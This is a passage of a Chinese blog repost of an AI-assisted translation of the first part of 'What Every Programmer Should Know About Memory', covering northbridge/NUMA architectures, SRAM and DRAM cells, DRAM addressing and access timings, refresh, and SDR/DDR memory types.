    <url>/2024/04/28/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part1/</url>
    
    <content type="html"><![CDATA[<p>转载自 lwn 网站的几篇关于内存的文章，使用 kimi 进行辅助翻译。</p><span id="more"></span><h1 id="每个程序员都应该了解的关于内存的知识，第一部分"><a href="#每个程序员都应该了解的关于内存的知识，第一部分" class="headerlink" title="每个程序员都应该了解的关于内存的知识，第一部分"></a>每个程序员都应该了解的关于内存的知识，第一部分</h1><h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1 引言"></a>1 引言</h2><p>在计算机的早期，它们要简单得多。系统的各个组件，如CPU、内存、大容量存储和网络接口是一起开发的，因此它们的性能相当平衡。例如，内存和网络接口在提供数据方面并不比CPU快多少。</p><p>一旦计算机的基本结构稳定下来，硬件开发人员集中优化各个子系统，这种情况就发生了变化。突然，计算机的一些组件的性能明显落后，出现了瓶颈。这尤其适用于大容量存储和内存子系统，由于成本原因，它们的改进速度相对于其他组件要慢得多。</p><p>大容量存储的缓慢性大多通过软件技术来解决：操作系统将最常使用（和最有可能被使用）的数据保留在主存储器中，这可以比硬盘快几个数量级的速度访问。缓存存储被添加到存储设备本身，这不需要操作系统的任何更改即可提高性能。然而，为了在使用存储设备缓存时保证数据完整性，需要进行更改。对于本文的目的，我们不会详细介绍大容量存储访问的软件优化。</p><p>与存储子系统不同，消除主存储器作为瓶颈要困难得多，几乎所有的解决方案都需要对硬件进行更改。今天，这些更改主要采取以下形式：</p><ul><li>随机存取存储器（RAM）硬件设计（速度和并行性）。</li><li>内存控制器设计。</li><li>CPU缓存。</li><li>设备的直接内存访问（DMA）。</li></ul><p>本文将主要讨论CPU缓存和内存控制器设计的一些影响。在探索这些主题的过程中，我们将探讨DMA并将其纳入更大的图景。然而，我们将从对当今商品硬件设计的概述开始。这是理解有效使用内存子系统的问题和局限性的先决条件。我们还将详细了解不同类型的RAM，并说明为什么这些差异仍然存在。</p><p>本文并不全面且最终。它限于商品硬件，并且进一步限于该硬件的一个子集。此外，许多主题只讨论了足够的细节，以实现本文的目标。对于这些主题，建议读者查找更详细的文档。</p><p>当涉及到特定于操作系统的详细信息和解决方案时，文本专门描述了Linux。它不会包含任何关于其他操作系统的信息。作者对讨论其他操作系统的影响没有兴趣。如果读者认为他们需要使用不同的操作系统，他们必须去他们的供应商那里，并要求他们编写类似于本文的文档。</p><p>在开始之前，最后一点评论。文本中包含了许多“通常”和类似限定词的用法。这里讨论的技术在现实世界中存在许多变体，本文只涉及最常见、最主流的版本。关于这项技术，很少能做出绝对的陈述，因此使用了限定词。</p><h3 id="1-1-文档结构"><a href="#1-1-文档结构" class="headerlink" title="1.1 文档结构"></a>1.1 文档结构</h3><p>本文主要针对软件开发人员。它没有深入到对硬件技术细节的讨论，对面向硬件的读者来说可能不够有用。但在我们可以进入对开发人员实用的信息之前，必须奠定很多基础。</p><p>为此，第二节详细描述了随机存取存储器（RAM）。本节的内容是很好的知识，但并不是绝对关键，以便能够理解后续各节。在需要内容的地方添加了适当的后文引用，以便心急的读者可以首先跳过本节的大部分。</p><p>第三节详细讨论了CPU缓存的行为。为了保持文本不像其他情况下那样枯燥，使用了图表。这些内容对于理解本文的其余部分至关重要。第4节简要介绍了虚拟内存的实现。这也是其余部分所需的基础工作。</p><p>第5节详细讨论了非统一内存访问（NUMA）系统。</p><p>第6节是本文的核心部分。它汇总了前面各节的所有信息，并为程序员提供了如何在各种情况下表现良好的代码编写建议。非常不耐烦的读者可以从本节开始，如有必要，可以回到早期的部分以刷新对底层技术的知识。</p><p>第7节介绍了可以帮助程序员做得更好的工具。即使对技术有完全的理解，也远非显而易见在非平凡软件项目中问题所在。某些工具是必要的。</p><p>在第8节中，我们最终给出了可以预期在不久的将来出现的技术展望，或者可能只是很好的拥有的技术。</p><h3 id="1-2-报告问题"><a href="#1-2-报告问题" class="headerlink" title="1.2 报告问题"></a>1.2 报告问题</h3><p>作者打算在一段时间内更新本文。这包括由于技术进步而必须进行的更新，也包括纠正错误。愿意报告问题的读者被鼓励发送电子邮件。</p><h3 id="1-3-致谢"><a href="#1-3-致谢" class="headerlink" title="1.3 致谢"></a>1.3 致谢</h3><p>我要感谢Johnray Fuller，特别是Jonathan Corbet，他们承担了将作者的英语形式转换为更传统形式的部分艰巨任务。Markus Armbruster在文本中的问题和遗漏提供了许多宝贵的意见。</p><h3 id="1-4-关于本文"><a href="#1-4-关于本文" class="headerlink" title="1.4 关于本文"></a>1.4 关于本文</h3><p>本文的标题是对David Goldberg的经典论文“每个计算机科学家都应该知道的关于浮点算术的知识”的致敬。Goldberg的论文仍然不为人所知，尽管它应该是任何敢于为严肃编程而触碰键盘的人的先决条件。</p><h2 id="2-今日商品硬件"><a href="#2-今日商品硬件" class="headerlink" title="2 今日商品硬件"></a>2 今日商品硬件</h2><p>理解商品硬件很重要，因为专用硬件正在退却。如今，扩展通常是通过水平而不是垂直实现的，这意味着使用许多较小的、连接在一起的商品计算机比使用一些真正快速（和昂贵）的大型系统更具成本效益。这是因为快速且价格低廉的网络硬件广泛可用。仍然存在大型专用系统的情况，这些系统仍然提供了一个商机，但总体市场被商品硬件市场所掩盖。截至2007年，Red Hat预计，对于未来的产品，大多数数据中心的“标准构建块”将是一台计算机，最多有四个插座，每个插座装有一个四核CPU，就Intel CPU而言，将是超线程的。超线程使单个处理器核心能够仅通过一点额外的硬件就被用于两个或更多并发执行。这意味着数据中心的标准系统将有多达64个虚拟处理器。更大的机器将得到支持，但四插座、四CPU核心的情况目前被认为是最佳点，大多数优化都针对这样的机器。</p><p>商品计算机的结构存在很大差异。话虽如此，我们将通过关注最重要的差异来涵盖超过90%的此类硬件。请注意，这些技术细节变化迅速，因此建议读者考虑本文的日期。</p><p>多年来，个人计算机和小型服务器标准化了一个由两个部分组成的芯片组：北桥和南桥。图2.1显示了这种结构。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281205628.png"></p><p>所有CPU（以前的例子中有两，但可以更多）都通过一个公共总线（前端总线，FSB）连接到北桥。北桥包含内存控制器，其实现决定了计算机使用的RAM芯片类型。不同类型的RAM，如DRAM、Rambus和SDRAM，需要不同的内存控制器。</p><p>为了到达所有其他系统设备，北桥必须与南桥通信。南桥通常被称为I&#x2F;O桥，通过各种不同的总线处理与设备的通信。今天，PCI、PCI Express、SATA和USB总线最为重要，但南桥也支持PATA、IEEE 1394、串行和并行端口。旧系统有AGP插槽，它们连接到北桥。这是出于与北桥和南桥之间连接速度不足相关的性能原因。然而，今天所有的PCI-E插槽都连接到南桥。</p><p>这种系统结构有一些值得注意的后果：</p><ul><li>所有从一个CPU到另一个CPU的数据通信都必须通过与北桥通信的同一总线进行。</li><li>与RAM的所有通信都必须通过北桥。</li><li>RAM只有一个端口。</li><li>我们不会在本文中讨论多端口RAM，因为这种类型的RAM不存在于商品硬件中，至少在程序员可以访问的地方不存在。它可以在依赖于最高速度的专业硬件中找到，例如网络路由器。</li></ul><p>立即显现出这种设计中的几个瓶颈。一个瓶颈涉及设备的RAM访问。在PC的最初几天，与两个桥上的所有设备的通信都必须通过CPU，对整体系统性能产生了负面影响。为了解决这个问题，一些设备能够进行直接内存访问（DMA）。DMA允许设备在北桥的帮助下直接在RAM中存储和接收数据，而无需CPU（及其固有的性能成本）的干预。今天，所有高性能设备都可以使用任何总线上的DMA。虽然这大大减少了CPU的工作量，但它也造成了北桥带宽的竞争，因为DMA请求与CPU对RAM的访问竞争。因此，必须考虑这个问题。</p><p>第二个瓶颈涉及从北桥到RAM的总线。总线的确切细节取决于部署的内存类型。在旧系统中，所有RAM芯片只有一个总线，因此无法进行并行访问。最近的RAM类型需要两个单独的总线（或称为通道，如DDR2中所示），这使得可用带宽翻倍。北桥在通道之间交错内存访问。更近期的内存技术（例如FB-DRAM）增加了更多通道。</p><p>由于可用带宽有限，重要的是以最小化延迟的方式安排内存访问。正如我们将看到的，处理器要快得多，并且必须等待才能访问内存，尽管使用了CPU缓存。如果多个超线程、核心或处理器同时访问内存，内存访问的等待时间甚至更长。DMA操作也是如此。</p><p>然而，访问内存不仅仅是并发性的问题。访问模式本身也极大地影响内存子系统的性能，尤其是具有多个内存通道时。有关RAM访问模式的更多详细信息，请参阅第2.2节。</p><p>在一些更昂贵的系统中，北桥实际上并不包含内存控制器。相反，北桥可以连接到多个外部内存控制器（以下示例中为四个）。图2.2显示了这样一个系统。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281206643.png"></p><p>这种架构的优点是存在多于一个的内存总线，因此总带宽增加。这种设计还支持更多内存。并发内存访问模式通过同时访问不同的内存库减少延迟。这在多个处理器直接连接到北桥时尤其如此，如图2.2所示。对于这种设计，主要的限制是北桥的内部带宽，对于这种架构（来自Intel）来说是惊人的。</p><p>使用多个外部内存控制器并不是增加内存带宽的唯一方法。另一种越来越流行的方式是将内存控制器集成到CPU中，并将内存连接到每个CPU。这种架构由基于AMD Opteron处理器的SMP系统推广。图2.3显示了这样一个系统。Intel将从Nehalem处理器开始支持通用系统接口（CSI），这基本上是相同的方法：具有集成内存控制器的本地内存的可能性。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281207758.png"></p><p>在这种架构中，可用的内存库数量与处理器数量一样多。在四CPU机器上，内存带宽在不需要复杂的北桥和巨大带宽的情况下增加了四倍。将内存控制器集成到CPU中还有一些额外的优点；我们在这里不会深入探讨这项技术。</p><p>然而，这种架构也有缺点。首先，因为机器仍然必须使系统的整个内存对所有处理器都可访问，内存不再是统一的（因此称这种架构为NUMA - 非统一内存架构）。本地内存（连接到处理器的内存）可以以通常的速度访问。当访问连接到另一个处理器的内存时，情况就不同了。在这种情况下，必须使用处理器之间的互连。从CPU1访问连接到CPU2的内存需要通过一个互连进行通信。当同一个CPU访问连接到CPU4的内存时，必须穿过两个互连。</p><p>每次这样的通信都有相关的成本。当我们描述访问远程内存所需的额外时间时，我们谈论的是“NUMA因子”。图2.3中的示例架构对每个CPU有两个级别：紧邻的CPU和一个CPU，它通过两个互连远离。在更复杂的机器中，级别数量可以显著增长。还有一些机器架构（例如IBM的x445和SGI的Altix系列），其中有一种以上的连接。CPU被组织成节点；在节点内访问内存的时间可能是统一的，或者只有小的NUMA因子。节点之间的连接可能非常昂贵，而且NUMA因子可能相当高。</p><p>今天存在商品NUMA机器，并且在未来可能会扮演更大的角色。预计从2008年底开始，每台SMP机器将使用NUMA。与NUMA相关的成本使其在程序运行在NUMA机器上时变得重要。在第5节中，我们将讨论更多的机器架构和Linux内核为这些程序提供的一些技术。</p><p>在本节的其余部分中描述的技术细节之外，还有几个额外的因素会影响RAM的性能。它们无法通过软件控制，这就是为什么它们没有在这一部分中被涵盖。感兴趣的读者可以在第2.1节中了解到其中一些因素。它们真的只需要得到一个更完整的RAM技术图景，并可能在购买计算机时做出更好的决策。</p><p>接下来的两节将讨论门级硬件细节和内存控制器与DRAM芯片之间的访问协议。程序员可能会发现这些信息很有启发性，因为这些细节解释了为什么RAM访问的工作方式。这是可选的知识，但是急于了解对日常生活有更直接相关性的主题的读者可以跳到第2.2.5节。</p><h3 id="2-1-RAM类型"><a href="#2-1-RAM类型" class="headerlink" title="2.1 RAM类型"></a>2.1 RAM类型</h3><p>多年来出现了许多类型的RAM，每种类型都有所不同，有时差异显著。旧的类型今天真的只是对历史学家感兴趣。我们将不会探索那些细节。相反，我们将集中讨论现代RAM类型；我们只会触及一些细节，这些细节通过它们的性能特征对内核或应用程序开发人员是可见的。</p><p>首先有趣的细节围绕着为什么同一台机器中存在不同类型的RAM的问题。更具体地说，为什么会同时有静态RAM（SRAM { <em>在其他上下文中</em> SRAM可能意味着“同步RAM”。_}）和动态RAM（DRAM）。前者要快得多，并提供相同的功能。为什么不是机器中的所有RAM都是SRAM？答案正如人们所预期的那样，是成本。SRAM的生产和使用成本比DRAM要高得多。这两个成本因素都很重要，第二个因素的重要性越来越增加。为了理解这些差异，我们看看SRAM和DRAM的比特存储实现。</p><p>在本节的其余部分中，我们将讨论RAM实现的一些低级细节。我们将尽可能保持细节水平低。为此，我们将在“逻辑级别”上讨论信号，而不是硬件设计师必须使用的级别。这里的细节水平对我们的目的来说是不必要的。</p><p><strong>2.1.1 静态RAM</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281207702.png" alt="Figure 2.4: 6-T Static RAM"></p><p>图2.4显示了一个6晶体管SRAM单元的结构。这个单元的核心是由M1到M4的四个晶体管形成的两个交叉耦合的反相器。它们有两个稳定状态，分别代表0和1。只要Vdd上的电源可用，状态就是稳定的。</p><p>如果需要访问单元的状态，可以提升字访问线WL。这使得单元的状态立即在BL和BL上可用进行读取。如果必须覆盖单元的状态，则首先将BL和BL线设置为所需的值，然后提升WL。由于外部驱动器比M1到M4的四个晶体管更强大，这允许旧状态被覆盖。</p><p>有关该单元工作方式的更详细描述，请参见[SRAM wiki]。对于接下来的讨论，重要的是要注意：</p><ul><li>一个单元需要六个晶体管。有变体使用四个晶体管，但它们有缺点。</li><li>维持单元状态需要恒定的电源。</li><li>一旦提升字访问线WL，单元状态几乎可以立即用于读取。信号像其他晶体管控制的信号一样是矩形的（在两个二进制状态之间快速变化）。</li><li>单元状态是稳定的，不需要刷新周期。</li></ul><p>还有其他更慢、功耗更低的SRAM形式可用，但这些在这里不感兴趣，因为我们正在寻找快速的RAM。这些慢变种主要是因为它们的接口更简单，所以更容易在系统中使用，而不是动态RAM。</p><p><strong>2.1.2 动态RAM</strong></p><p>动态RAM在其结构上比静态RAM要简单得多。图2.5显示了一个典型的DRAM单元设计。它只由一个晶体管和一个电容器组成。这种巨大的复杂性差异当然意味着它的功能与静态RAM非常不同。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281208321.png"></p><p>动态RAM单元将状态保持在电容器C中。晶体管M用于保护对状态的访问。要读取单元的状态，可以提升访问线AL；这将根据电容器中的电荷在数据线DL上引起或不引起电流流动。要向单元写入数据，适当地设置数据线DL，然后提升AL足够长的时间以充电或排放电容器。</p><p>动态RAM的设计有许多复杂性。使用电容器意味着读取单元会放电电容器。这个过程不能无限重复，电容器必须在某个时候重新充电。更糟糕的是，为了容纳大量的单元（现在常见的芯片有10^9或更多单元），电容器的容量必须很低（在飞法拉德范围或更低）。一个完全充电的电容器持有几万个电子。尽管电容器的电阻很高（几万亿欧姆），但它只需要很短的时间就能放电。这个问题称为“漏电”。</p><p>这种漏电是为什么DRAM单元必须不断刷新的原因。对于大多数DRAM芯片，现在必须每64ms刷新一次。在刷新周期期间，无法访问内存。对于一些工作负载，这个开销可能会使多达50%的内存访问停止（见[highperfdram]）。</p><p>第二个问题是由于电荷微小，从单元读取的信息不能直接使用。数据线必须连接到感测放大器，该放大器可以在仍然必须算作1的整个电荷范围内区分存储的0或1。</p><p>第三个问题是充电和放电电容器不是瞬时的。感测放大器接收到的信号不是矩形的，因此必须保守估计电容器放电到足以使用的输出所需的时间。充电和放电电容器的公式为：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281208705.png"></p><p>这意味着需要一些时间（由电容C和电阻R决定）来充电和放电电容器。这也意味着感测放大器可以检测到的电流不是立即可用的。图2.6显示了充电和放电曲线。X轴以RC（电阻乘以电容）为单位测量，这是时间的单位。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281208427.png"></p><p>与静态RAM的情况不同，当提升字访问线时，输出立即可用，而DRAM的情况是，电容器总是需要一点时间才能足够放电。这个延迟严重限制了DRAM的速度。</p><p>简单的方法也有其优点。主要优点是尺寸。一个DRAM单元所需的芯片面积比一个SRAM单元小得多。SRAM单元还需要为维持状态的晶体管提供单独的电源。DRAM单元的结构也更简单、更规则，这意味着将许多单元紧密地组合在芯片上更简单。</p><p>总体而言，成本差异（相当戏剧性）赢了。除了专业硬件（例如网络路由器）之外，我们不得不使用基于DRAM的主存储器。这对程序员有巨大的影响，我们将在本文的其余部分讨论。但首先，我们需要查看一些关于实际使用DRAM单元的更多细节。</p><p><strong>2.1.3 DRAM访问</strong></p><p>程序使用虚拟地址选择一个内存位置。处理器将此转换为物理地址，最后内存控制器选择对应的RAM芯片。要在选择的RAM芯片上选择单个内存单元，物理地址的部分作为地址线的一组传递。</p><p>从内存控制器单独寻址内存位置是完全不切实际的：4GB的RAM将需要2^32条地址线。</p><p>相反，地址被编码为二进制数字传递，使用一组较小的地址线。以这种方式传递给DRAM芯片的地址必须首先被解复用。具有N条地址线的解复用器将有2^N条输出线。这些输出线可以用来选择存储单元。使用这种直接方法是没有问题的，对于容量较小的芯片来说不是大问题。</p><p>但是，如果单元数量增加，这种方法就不再适用了。一个具有1Gbit容量的芯片将需要30条地址线和2^30条选择线。解复用器的大小随着输入线路数量的增加而呈指数增长，当速度不是要牺牲的时候。对于30条地址线，需要大量的芯片面积，除了解复用器的复杂性（大小和时间）。更重要的是，同时传输30个脉冲到地址线上比“仅”传输15个脉冲要困难得多。更少的线路需要以完全相同的长度布置或适当地定时。现代DRAM类型，如DDR3，可以自动调整时间，但对于可以容忍的东西有一个限制。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281209072.png"></p><p>图2.7以非常高的水平显示了DRAM芯片。DRAM单元以行和列的形式组织。它们可以全部对齐在一行中，但那样DRAM芯片将需要一个巨大的解复用器。通过阵列方法，设计可以在只有一个解复用器和一个一半大小的多路复用器的情况下得到满足。这是一个巨大的节省，在所有方面。在示例中，地址线a0和a1通过行地址选择（RAS）解复用器选择整行单元的地址线。在读取引时，所有单元的内容因此可以提供给列地址选择（CAS）多路复用器。基于地址线a2和a3，一列的内容然后可以提供给DRAM芯片的数据引脚。这在许多DRAM芯片上多次并行发生，以产生对应于数据总线宽度的总位数。</p><p>对于写入，新单元值放在数据总线上，当使用RAS和CAS选择单元时，它被存储在单元中。</p><p>一个相当直接的设计。在现实中——显然——有更多的复杂性。需要有规定，信号在数据在数据总线上可用之前有多少延迟。电容器不会立即放电，如前一节所述。来自单元的信号太弱，需要放大。对于写入，必须指定在RAS和CAS完成后，数据必须在总线上可用多长时间才能成功地在单元中存储新值（再次，电容器不会立即充满或排空）。这些时序常数对DRAM芯片的性能至关重要。我们将在下一节中讨论这个问题。</p><p>一个次要的可扩展性问题是，将30条地址线连接到每个RAM芯片也是不可行的。芯片的引脚是宝贵的资源。数据必须尽可能多地并行传输（例如，以64位批次）。内存控制器必须能够寻址每个RAM模块（RAM芯片的集合）。如果为了性能原因需要并行访问多个RAM模块，并且每个RAM模块都需要自己的30条或更多地址线，那么内存控制器需要为8个RAM模块有240多个引脚仅用于地址处理。</p><p>为了应对DRAM芯片的这些次要可扩展性问题，DRAM芯片长期以来已经复用了地址本身。这意味着地址被分成两部分传输。第一部分由地址位a0和a1组成，在图2.7的示例中选择行。这个选择一直保持有效，直到被撤销。然后第二部分，地址位a2和a3，选择列。关键的区别是只需要两条外部地址线。需要一些更多的线路来指示RAS和CAS信号何时可用，但这是一个小代价，用于减少地址线数量的一半。这种地址多路复用带来了它自己的问题，尽管如此。我们将在第2.2节中讨论它们。</p><p><strong>2.1.4 结论</strong></p><p>如果本节的细节有点压倒性，请不要担心。从本节中要记住的重要的是：</p><ul><li>有原因不是所有内存都是SRAM</li><li>内存单元需要单独选择才能使用</li><li>地址线的数量直接负责内存控制器、主板、DRAM模块和DRAM芯片的成本</li><li>读取或写入操作的结果可用之前需要一段时间</li></ul><p>接下来的一节将更详细地讨论实际访问DRAM内存的过程。我们将不深入讨论访问SRAM的更多细节，因为它通常是直接寻址的。这发生在速度上，因为SRAM内存的大小有限。SRAM目前在CPU缓存和片上使用，连接很小，完全由CPU设计师控制。CPU缓存是我们稍后讨论的主题，但我们需要知道的是SRAM单元的最大速度取决于花费在SRAM上的精力。速度可以从仅略慢于CPU核心到一到两个数量级更慢不等。</p><h3 id="2-2-DRAM访问技术细节"><a href="#2-2-DRAM访问技术细节" class="headerlink" title="2.2 DRAM访问技术细节"></a>2.2 DRAM访问技术细节</h3><p>在介绍DRAM的部分中，我们看到DRAM芯片复用了地址以节省资源。我们还看到，由于单元中的电容器不立即放电以产生稳定的信号，访问DRAM单元需要时间；我们还看到，DRAM单元必须刷新。现在，是时候将所有这些因素放在一起，看看它们如何决定DRAM访问必须如何发生了。</p><p>我们将集中讨论当前技术；我们将不讨论异步DRAM及其变体，因为它们现在已经不相关了。对这个话题感兴趣的读者可以参考[highperfdram]和[arstechtwo]。我们也不会讨论Rambus DRAM（RDRAM），尽管这项技术并没有过时。它只是不广泛用于系统内存。我们将专门集中讨论同步DRAM（SDRAM）及其后继者双数据速率DRAM（DDR）。</p><p>同步DRAM，顾名思义，相对于一个时间源工作。内存控制器提供一个时钟，其频率决定了DRAM芯片使用的内存控制器接口（前端总线，FSB）的速度。截至本文撰写时，可用的频率为800MHz、1,066MHz，甚至1,333MHz，下一代将宣布更高的频率（1,600MHz）。这并不意味着总线上实际使用的频率实际上是这么高。相反，今天的总线是双倍或四倍泵送的，这意味着每个周期传输两次或四次数据。更高的数字更好卖，所以制造商喜欢将一个四倍泵送的200MHz总线宣传为“有效”的800MHz总线。</p><p>对于SDRAM，今天的每个数据传输由64位——8字节组成。因此，FSB的传输速率因此是8字节乘以有效总线频率（对于四倍泵送的200MHz总线为6.4GB&#x2F;s）。听起来像是很多，但它是突发速度，即永远不会被超越的最大速度。正如我们现在将看到的，与RAM模块通信的协议有很多停机时间，在此期间无法传输数据。我们必须理解并最小化这种停机时间，以实现最佳性能。</p><p><strong>2.2.1 读取访问协议</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281216242.png"></p><p>图2.8显示了DRAM模块的一些连接器的活动，这些活动发生在三个不同颜色的阶段中。像往常一样，时间从左到右流动。这里省略了很多细节。我们在这里只讨论总线时钟、RAS和CAS信号，以及地址和数据总线。一个读取周期始于内存控制器在地址总线上提供行地址并降低RAS信号。所有信号都在时钟（CLK）的上升沿读取，因此只要信号在读取时稳定，它不完全方形就没关系。设置行地址会导致RAM芯片开始锁定地址所在的行。</p><p>CAS信号可以在tRCD（RAS到CAS延迟）时钟周期后发送。然后通过在地址总线上提供它并降低CAS线来传输列地址。在这里，我们可以看到地址的两个部分（或多或少是两半，没有其他意义）可以通过同一个地址总线传输。</p><p>现在寻址已经完成，可以传输数据了。RAM芯片需要一些时间来为此做准备。通常称这种延迟为CAS延迟（CL）。在图2.8中，CAS延迟为2。它可能更高或更低，这取决于内存控制器、主板和DRAM模块的质量。延迟也可以有半值。使用CL&#x3D;2.5，第一个数据将在蓝色区域的第一个下降沿处可用。</p><p>有了所有这些准备工作来获取数据，如果只传输一个数据字就太浪费了。这就是为什么DRAM模块允许内存控制器指定要传输多少数据。通常选择是2、4或8个字。这允许在不使用新的RAS&#x2F;CAS序列的情况下填满缓存中的整个行。内存控制器还可以在不重置行选择的情况下发送新的CAS信号。通过这种方式，可以显著更快地读取或写入连续的内存地址，因为不需要发送RAS信号，行也不需要被停用（见下文）。保持行“打开”是内存控制器必须决定的事情。一直推测性地保持它打开所有时间在现实世界的应用中有缺点（见[highperfdram]）。发送新的CAS信号只受RAM模块的命令速率限制（通常指定为T_x，其中x是一个像1或2这样的值；对于每个周期都接受新命令的高性能DRAM模块，它将是1）。</p><p>在这个例子中，SDRAM每个周期输出一个字。这是第一代所做的。DDR每周期能够传输两个字。这减少了传输时间，但并没有改变延迟。原则上，DDR2的工作方式相同，尽管在实践中看起来不同。这里没有必要深入细节。重要的是注意到DDR2可以更快、更便宜、更可靠，并且更节能（有关更多信息，请参见[ddrtwo]）。</p><p><strong>2.2.2 预充电和激活</strong></p><p>图2.8没有涵盖整个周期。它只显示了访问DRAM的部分完整周期。在可以发送新的RAS信号之前，当前锁定的行必须停用，并且必须预充电新的行。我们可以集中讨论在这种情况下使用显式命令完成的情况。对协议有一些改进，在某些情况下，允许避免这个额外步骤。然而，预充电引入的延迟仍然影响操作。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281216571.png"></p><p>图2.9显示了从一个CAS信号到另一行的CAS信号的活动。使用第一个CAS信号请求的数据像以前一样，在CL周期后可用。在示例中，请求了两个单词，在一个简单的SDRAM上，需要两个周期来传输。或者，想象一下在DDR芯片上的四个单词。</p><p>即使在命令速率为一的DRAM模块上，也不能立即发出预充电命令。必须等待足够长的时间以传输数据。在这种情况下，需要两个周期。这恰好是CL，但这只是巧合。预充电信号没有专用线；相反，一些实现通过同时降低写使能（WE）和RAS线来发出它。这个组合本身没有有用的含义（有关编码细节，请参阅[micronddr]）。</p><p>一旦发出预充电命令，就需要tRP（行预充电时间）周期，直到可以选中行。在图2.9中</p><p>如果我们继续图表中的时间线，我们会找到下一个数据传输发生在前一个停止后5个周期。这意味着数据总线在七个周期中只使用了两个周期。将这个数字乘以FSB速度，理论上800MHz总线的6.4GB&#x2F;s就变成了1.8GB&#x2F;s。这很糟糕，必须避免。第6节中描述的技术有助于提高这个数字。但程序员通常必须尽自己的一份力。</p><p>SDRAM模块还有一个我们没有讨论的时序值。在图2.9中，预充电命令仅受数据传输时间限制。另一个限制是SDRAM模块需要时间，在RAS信号之后，才能预充电另一行（表示为tRAS）。这个数字通常相当高，大约是tRP值的两到三倍。如果，在RAS信号之后，只跟了一个CAS信号，并且数据传输在几个周期内完成，那么这就是一个问题。假设在图2.9中，初始CAS信号直接由RAS信号先导，并且tRAS是8个周期。那么预充电命令将不得不延迟一个额外的周期，因为tRCD、CL和tRP（由于它大于数据传输时间）的总和只有7个周期。</p><p>DDR模块通常使用特殊符号描述：w-x-y-z-T。例如：2-3-2-8-T1。这意味着：</p><ul><li>w | 2 | CAS延迟（CL）</li><li>x | 3 | RAS到CAS延迟（tRCD）</li><li>y | 2 | RAS预充电（tRP）</li><li>z | 8 | 激活到预充电延迟（tRAS）</li><li>T | T1 | 命令速率</li></ul><p>还有许多其他时序常数影响命令的发出和处理方式。但这五个常数在实践中足以确定模块的性能。</p><p>有时了解这些信息对于使用的计算机是有用的，以能够解释某些测量。在购买计算机时，了解这些细节肯定有用，因为它们以及FSB和SDRAM模块速度是决定计算机速度的最重要因素之一。</p><p>非常大胆的读者也可以尝试调整系统。有时BIOS允许更改其中一些或所有这些值。SDRAM模块有可编程寄存器，可以设置这些值。通常BIOS选择最佳默认值。如果RAM模块的质量很高，可能可以减少一个或另一个延迟，而不影响计算机的稳定性。互联网上有许多超频网站提供了大量文档供这样做。但请自行承担风险，并且不要说你没有被警告过。</p><p><strong>2.2.3 充电</strong></p><p>在访问DRAM时，一个经常被忽视的话题是充电。正如第2.1.2节中所解释的，DRAM单元必须不断刷新。这并不是对系统的其余部分完全透明的。在行被充电的时候，无法进行访问。在[highperfdram]中的一项研究发现，“DRAM刷新组织可能会戏剧性地影响性能”。</p><p>每个DRAM单元必须根据JEDEC规范每64ms刷新一次。如果一个DRAM阵列有8,192行，这意味着内存控制器必须平均每7.8125µs发出一个刷新命令（刷新命令可以排队，因此实际上两个请求之间的最大间隔可以更高）。调度刷新命令是内存控制器的责任。DRAM模块跟踪最后刷新行的地址，并自动为每个新请求增加地址计数器。</p><p>程序员实际上对刷新和发出命令的时间点无能为力。但重要的是要记住DRAM生命周期的这一部分，当解释测量时。如果必须从当前正在刷新的行中检索关键单词，处理器可能会被停用相当长的时间。每次刷新需要多长时间取决于DRAM模块。</p><p><strong>2.2.4 内存类型</strong></p><p>值得花时间了解当前和即将使用的内存类型。我们将从SDR（单数据速率）SDRAM开始，因为它们是DDR（双数据速率）SDRAM的基础。SDRs相当简单。内存单元和数据传输速率是相同的。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281217520.png"></p><p>在图2.10中，DRAM单元阵列可以以与内存总线传输相同的速率输出内存内容。如果DRAM单元阵列能够以100MHz的频率运行，那么总线的数据传输速率就是100Mb&#x2F;s。所有组件的频率 ( f ) 是相同的。增加DRAM芯片的吞吐量是昂贵的，因为能耗随着频率的增加而增加。对于拥有大量阵列单元的系统来说，这尤其昂贵。实际上，增加频率通常还需要增加电压以维持系统的稳定性，这进一步增加了复杂性。电源功耗的计算公式是 ( \text{Power} &#x3D; \text{Dynamic Capacity} \times \text{Voltage}^2 \times \text{Frequency} )。</p><p>DDR SDRAM（通常被称为DDR1）实现了在不增加任何相关频率的情况下提高吞吐量的技术。这意味着DDR1能够在不提高内存单元阵列或总线的工作频率的前提下，实现双倍的数据传输速率。这是通过在每个时钟周期的上升沿和下降沿都传输数据来实现的，这种方法有时被称为“双沿泵送”或“双泵送”总线。通过这种机制，DDR1在不增加单元阵列的运行频率的情况下，能够在保持能耗相对较低的同时，提供更高的数据传输速率。</p><p>SDR DRAMs以其频率命名（例如，PC100代表100MHz的SDR）。为了使DDR1 DRAM听起来更先进，市场营销人员不得不想出一种新的命名方案，因为工作频率并没有变化。他们采用了一个包含DDR模块（它们拥有64位宽的总线）能够持续支持的传输速率的名称：</p><p>100MHz × 64bit × 2 &#x3D; 1,600MB&#x2F;s</p><p>因此，一个频率为100MHz的DDR模块被称为PC1600。1600&gt;100，所有营销要求都得到了满足；听起来好多了，尽管改进实际上只是两倍的因素。我将接受这个两倍的因素，但我不必喜欢这些夸大的数字。</p><p><img 